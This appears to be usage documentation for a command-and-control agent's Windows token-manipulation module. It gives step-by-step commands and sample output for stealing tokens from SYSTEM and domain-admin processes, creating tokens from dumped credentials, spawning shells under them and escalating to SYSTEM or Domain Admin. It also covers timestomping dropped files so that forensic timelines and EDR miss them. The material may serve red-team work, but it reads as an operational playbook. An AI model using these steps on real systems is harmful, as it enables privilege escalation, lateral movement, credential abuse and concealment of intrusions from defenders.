# Token Manipulation

Steal, impersonate, and create Windows access tokens to operate under different user identities — including SYSTEM, Domain Admin, or arbitrary domain users.

---

## Background: Windows Access Tokens

Every process and thread in Windows runs under an access token that defines its security context: user SID, group memberships, privileges. Impersonating another token makes the operating system believe you are that user for all subsequent API calls.

**Token types:**
- **Primary token** — assigned to a process at creation; defines the process identity
- **Impersonation token** — attached to a thread; temporarily overrides the thread's identity for a specific operation

To steal a token from another process you need:
- `SeDebugPrivilege` — to open processes owned by other users
- Admin or SYSTEM — in practice, most targets require this

---

## List Available Tokens

Enumerate processes and their associated token security contexts.

```
❯ token list a1b2
[*] Enumerating process tokens...
[+] Available tokens:

PID    Process              User                      Integrity   Privileges
----   -------              ----                      ---------   ----------
4      System               NT AUTHORITY\SYSTEM        System      All
644    lsass.exe            NT AUTHORITY\SYSTEM        System      SeDebugPrivilege, SeImpersonatePrivilege, ...
1124   svchost.exe          NT AUTHORITY\NETWORK SERVICE Medium    SeImpersonatePrivilege
2048   explorer.exe         corp\jsmith               Medium      SeChangeNotifyPrivilege
3456   mmc.exe              corp\domain.admin         High        SeDebugPrivilege, SeImpersonatePrivilege
4096   werfault.exe         NT AUTHORITY\SYSTEM        System      All
```

**What to look for:**
- **SYSTEM tokens** (PID 4, lsass.exe, werfault.exe) — full privilege, no restrictions
- **High integrity + SeDebugPrivilege** — can open other processes, steal more tokens
- **Domain Admin tokens** — access to domain resources, DCSync, etc.
- **Service account tokens** — often have network access, database credentials, etc.

---

## Steal and Impersonate a Token

Duplicate the access token from a target process and impersonate it in the agent thread.

```
❯ token steal a1b2 --pid 3456
[*] Stealing token from PID 3456 (mmc.exe)...
[+] Token stolen and impersonated.
    Now running as: corp\domain.admin
```

**Internally:**
1. `OpenProcess(PROCESS_QUERY_INFORMATION)` → get process handle
2. `OpenProcessToken` → get token handle
3. `DuplicateTokenEx(SecurityImpersonation, TokenImpersonation)` → create impersonation token
4. `ImpersonateLoggedOnUser` → apply token to current thread

**Verify the steal worked:**
```
❯ cmd a1b2 "whoami"
corp\domain.admin
```

---

## Revert to Original Token

```
❯ token revert a1b2
[*] Reverting to original token...
[+] Reverted. Now running as: corp\svc_backup
```

Internally calls `RevertToSelf()`. Always revert before the end of an engagement or before stealing a different token.

---

## Create a Token from Credentials

If you have a domain user's credentials (obtained from browser dump, keylog, LSASS, etc.), create a token for that user without stealing from an existing process.

```
❯ token make a1b2 \
    --user administrator \
    --domain corp \
    --pass "Summer2024!"
[*] Creating token for corp\administrator...
[+] Token created and impersonated.
    Now running as: corp\administrator
```

**Internally:** Calls `LogonUserA(LOGON32_LOGON_NEW_CREDENTIALS)`. This type of logon creates a token with network credentials — commands that use network resources (UNC paths, domain controllers) operate as the specified user. The local security context remains the same.

**When to use:**
- You have credentials from browser dump or keylog
- You need to access a network resource as a different user (file share, DC)
- You want to run lateral movement commands as a domain admin without first finding their token in a process

---

## Spawn a Process Under a Stolen Token

Run an executable in the security context of the stolen token.

```
# Spawn cmd.exe as the stolen domain admin token
❯ token runas a1b2 cmd.exe --pid 3456
[+] Spawned cmd.exe under token from PID 3456 (corp\domain.admin).

# Spawn powershell.exe using explicit credentials
❯ token runas a1b2 powershell.exe \
    --user administrator \
    --domain corp \
    --pass "Summer2024!"
[+] Spawned powershell.exe as corp\administrator.
```

**Use case:** After stealing a SYSTEM token, spawn a command shell under SYSTEM to perform privileged operations (registry modifications, service creation) while keeping your agent process running under the original lower-privileged account.

---

## Token Privilege Escalation Paths

Common paths from standard user → SYSTEM:

### Path 1: Service Account with SeImpersonatePrivilege

Many service accounts (IIS, SQL Server, network services) run with `SeImpersonatePrivilege`. This allows a process to impersonate any token that presents itself:

```
# If agent runs as IIS AppPool or similar:
# → Use named pipe impersonation (a SYSTEM process connects to your pipe)
# → Potato attacks work here (JuicyPotato, GodPotato, etc.)
# After escalation:
❯ token steal a1b2 --pid 4   # Steal SYSTEM token from PID 4
```

### Path 2: Local Admin → SYSTEM

```
# As local admin, find a SYSTEM process
❯ token list a1b2
# Steal from lsass.exe or System (PID 4)
❯ token steal a1b2 --pid 644   # lsass.exe = SYSTEM
```

### Path 3: Credentials → Domain Admin

```
# After credential dump, use make_token to get DA network access
❯ token make a1b2 --user administrator --domain corp --pass "CrackTheHash!"

# Now access domain resources
❯ cmd a1b2 "dir \\\\DC01\\SYSVOL"
❯ cmd a1b2 "net group 'Domain Admins' /domain"
```

---

## Timestomp

After dropping files on a target (uploads, dumps, tools), modify their timestamps to blend in with the surrounding directory — making forensic timeline analysis harder.

```
# Copy timestamps from kernel32.dll (the default reference)
❯ timestomp a1b2 "C:\Windows\Temp\svchost.exe"
[+] Timestamps copied from kernel32.dll to C:\Windows\Temp\svchost.exe

# Copy from a specific reference file
❯ timestomp a1b2 "C:\Windows\Temp\upd.exe" --ref "C:\Windows\explorer.exe"
[+] Timestamps copied from explorer.exe to upd.exe

# Set a specific timestamp
❯ timestomp a1b2 "C:\Windows\Temp\tool.exe" --time "2021-06-15T09:00:00Z"
[+] Timestamp set to 2021-06-15 09:00:00 UTC on tool.exe
```

**Why:** Forensic tools and EDRs use file timestamps to reconstruct attacker timelines. A file created at `2026-04-25 14:23:01` when `explorer.exe` is dated `2021-01-12 08:15:00` stands out immediately. After timestomping, the file appears to have existed long before your engagement.

**Note:** NTFS stores four timestamps per file (created, modified, accessed, MFT modified). Tools like `$MFT` analysis can reveal discrepancies — timestomping is a hindrance to analysis, not an absolute protection.
